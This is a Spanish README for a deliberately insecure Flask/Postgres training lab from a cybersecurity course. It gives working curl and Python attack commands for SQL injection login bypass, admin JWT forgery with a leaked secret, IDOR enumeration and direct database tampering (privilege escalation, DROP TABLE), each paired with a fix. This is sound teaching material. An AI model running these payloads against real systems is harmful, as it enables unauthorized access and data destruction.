# 🔓 lab-insecure

**Laboratorio de vulnerabilidades deliberadas para clase magistral de ciberseguridad**

> ⚠️ Este proyecto contiene VULNERABILIDADES INTENCIONALES.
> Uso exclusivo académico. NO DESPLEGAR EN PRODUCCIÓN.

---

## Requisitos

- Docker Desktop (Windows/Mac) o Docker Engine (Linux)
- `curl` o Postman
- Opcional: `psql` para el ejercicio de puerto DB expuesto

---

## Levantar el laboratorio

```bash
# 1. Clonar o descomprimir el proyecto
cd lab-insecure

# 2. Levantar los contenedores
docker compose up -d

# 3. Verificar que todo corra
docker compose ps

# Deberías ver:
# lab_db       running   0.0.0.0:5432->5432/tcp
# lab_backend  running   0.0.0.0:5000->5000/tcp

# 4. Verificar health
curl http://localhost:5000/health
```

---

## Vulnerabilidades incluidas

| ID  | Endpoint        | Vulnerabilidad              | Impacto                          |
|-----|-----------------|----------------------------|----------------------------------|
| V1  | POST /login     | SQL Injection               | Bypass de autenticación          |
| V2  | GET  /debug     | Secretos expuestos          | Robo de JWT_SECRET y credenciales|
| V3  | GET  /user/:id  | IDOR (sin autorización)     | Acceso a datos de otros usuarios |
| V4  | Base de datos   | Contraseñas en texto plano  | Dump = credenciales reales       |
| V5  | JWT             | Secreto débil hardcodeado   | Forjar tokens de admin           |
| V6  | CORS            | Access-Control-Allow-Origin:* | Peticiones desde cualquier dominio|
| V7  | Errores         | Stack traces al cliente     | Exposición de rutas internas     |

---

## ATAQUE 01 — SQL Injection

```bash
# Login normal (falla con contraseña incorrecta)
curl -s -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "wrong"}' | python3 -m json.tool

# SQL Injection — entra SIN contraseña válida
curl -s -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\''--", "password": "nada"}' | python3 -m json.tool

# Resultado esperado: {"status": "ok", "token": "...", "user": {...}}
# La query ejecutada fue:
# SELECT ... WHERE username='admin'--' AND password='nada'
#                              ↑
#                         -- comenta el AND password
```

**Fix:** usar prepared statements — `cur.execute("... WHERE username=%s AND password=%s", (u,p))`

Ver `/secure/login` para la versión corregida.

---

## ATAQUE 02 — Secretos expuestos en /debug

```bash
# Ver todas las variables de entorno de la app
curl -s http://localhost:5000/debug | python3 -m json.tool

# Obtendrás entre otras cosas:
# "JWT_SECRET": "mysecretkey"
# "DB_PASS": "admin123"

# Con el JWT_SECRET podés forjar un token de admin:
python3 - << 'PYEOF'
import jwt
from datetime import datetime, timedelta

secreto = "mysecretkey"   # obtenido del /debug
token = jwt.encode(
    {
        "user_id": 1,
        "username": "admin",
        "role": "admin",
        "exp": datetime.utcnow() + timedelta(days=30)
    },
    secreto,
    algorithm="HS256"
)
print("Token forjado de ADMIN:")
print(token)
PYEOF
```

**Fix:** eliminar /debug en producción. Usar AWS Secrets Manager o .env fuera del repo.

---

## ATAQUE 03 — IDOR (acceder a datos de otros usuarios)

```bash
# 1. Login como carlos (usuario normal)
TOKEN=$(curl -s -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username": "carlos", "password": "pass456"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

echo "Token de carlos: $TOKEN"

# 2. Con token de carlos, acceder a datos de ADMIN (user_id=1)
curl -s http://localhost:5000/user/1 \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool

# 3. Enumerar todos los usuarios
curl -s http://localhost:5000/user/2 -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
curl -s http://localhost:5000/user/3 -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
curl -s http://localhost:5000/user/4 -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

**Fix:** validar que `token['user_id'] == user_id` o que `token['role'] == 'admin'`.

Ver `/secure/user/<id>` para la versión corregida.

---

## ATAQUE 04 — Puerto de BD expuesto al exterior

```bash
# Conectarse DIRECTAMENTE a la BD, bypasseando toda la aplicación
# (requiere psql instalado en la máquina host)
psql -h localhost -U admin -d labdb
# Password: admin123

# Dentro de psql:
\dt                          -- listar tablas
SELECT * FROM users;         -- ver TODOS los usuarios con contraseñas
UPDATE users SET role='admin' WHERE username='carlos';   -- escalar privilegios
DROP TABLE products;         -- destrucción de datos
\q
```

**Fix en docker-compose.yml:**
```yaml
db:
  # Eliminar "ports:" y usar "expose:" para acceso solo interno
  expose:
    - "5432"
  # NO usar: ports: ["5432:5432"]
```

---

## Verificar las versiones seguras

```bash
# Login seguro (prepared statements)
curl -s -X POST http://localhost:5000/secure/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\''--", "password": "nada"}' | python3 -m json.tool
# Resultado esperado: {"error": "Credenciales incorrectas"} — NO hay injection

# Usuario seguro (con validación de autorización)
TOKEN=$(curl -s -X POST http://localhost:5000/secure/login \
  -H "Content-Type: application/json" \
  -d '{"username": "carlos", "password": "pass456"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

curl -s http://localhost:5000/secure/user/1 \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
# Resultado esperado: {"error": "Acceso denegado"} — el 403 funciona
```

---

## Comandos de utilidad

```bash
# Ver logs en tiempo real
docker compose logs -f backend

# Ver logs de la BD
docker compose logs db

# Reiniciar solo el backend (útil si se modifica app.py)
docker compose restart backend

# Entrar al contenedor del backend
docker exec -it lab_backend bash

# Entrar al contenedor de la BD
docker exec -it lab_db psql -U admin -d labdb

# Detener todo
docker compose down

# Detener y eliminar volúmenes (reset completo)
docker compose down -v
```

---

## Estructura del proyecto

```
lab-insecure/
├── docker-compose.yml     ← Orquestación (con vulnerabilidades de config)
├── README.md              ← Este archivo
├── backend/
│   ├── app.py             ← Flask con vulnerabilidades comentadas
│   ├── Dockerfile         ← Imagen (corre como root, imagen completa)
│   └── requirements.txt
└── db/
    └── init.sql           ← Datos de prueba (contraseñas en texto plano)
```

---

## Recursos para profundizar

- OWASP Top 10: https://owasp.org/Top10/
- DVWA (más ejercicios): https://github.com/digininja/DVWA
- TryHackMe: https://tryhackme.com
- HackTheBox: https://hackthebox.com

---

*Creado para clase magistral — Diplomado en Ciberseguridad*
